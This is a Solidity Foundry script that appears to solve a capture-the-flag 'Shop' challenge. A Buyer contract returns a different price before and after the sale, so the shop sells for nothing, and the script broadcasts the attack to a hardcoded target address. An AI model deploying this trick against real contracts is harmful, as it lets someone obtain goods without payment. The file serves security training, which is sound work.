// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.17;

import "forge-std/Script.sol";
import "forge-std/Test.sol";

interface IBuyer {
  function price() external view returns (uint256);
}

interface IShop {
  function buy() external;

  function price() external view returns (uint256);

  function isSold() external view returns (bool);
}

contract Buyer is IBuyer {
  function price() external view override returns (uint256) {
    if (IShop(msg.sender).isSold()) {
      return 0;
    } else {
      return 150;
    }
  }

  function solve(address target) external {
    IShop(target).buy();
    require(IShop(target).isSold(), "Failed to buy");
    require(IShop(target).price() == 0, "Failed to buy");
  }
}

contract Solve is Script, Test {
  address target = address(0x7Ce07b039E47069738F49F593cbE7529816EC93E);

  function run() public {
    vm.startBroadcast();

    Buyer buyer = new Buyer();
    buyer.solve(target);

    vm.stopBroadcast();
  }
}
